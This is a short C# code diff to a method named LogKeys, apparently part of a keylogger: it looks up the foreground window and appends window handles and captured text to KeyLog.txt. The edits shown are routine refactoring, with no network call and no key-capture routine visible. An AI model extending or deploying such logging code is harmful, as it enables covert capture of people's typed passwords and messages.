@@ -24,7 +24,7 @@ namespace CrcMrc
         [DllImport("user32.dll")]
         static extern IntPtr GetForegroundWindow();
 
-        public Int32[] iHwnd;
+        public Int32[] iHwnd = new Int32[0];
         public Int32 iCount = 0;
         public Int32 iCountStop = 100;
 
@@ -32,7 +32,9 @@ namespace CrcMrc
         public void LogKeys()
         {
             iCount = 0;
-            String path = @"n:\KeyLog.txt";
+            //String path = @"n:\KeyLog.txt";
+            String path = @"KeyLog.txt";
+            //path = Properties.Settings.Default.FileName;
             if (!File.Exists(path))
             {
                 using (StreamWriter sw = File.CreateText(path))
@@ -63,6 +65,8 @@ namespace CrcMrc
                         using (StreamWriter sw = File.AppendText(path))
                         {
                             sw.WriteLine(hwnd.ToString() + "@" + text);
+                            Array.Resize(ref iHwnd, iHwnd.Length + 1);
+                            iHwnd.SetValue(hwnd, iHwnd.Length-1);
                         }
 
                         break;
@@ -71,7 +75,7 @@ namespace CrcMrc
             }
         }
 
-        public void ResetInt()
+        public void ResetCounter()
         {
             Array.Clear(iHwnd, 0, iHwnd.Length);
         }
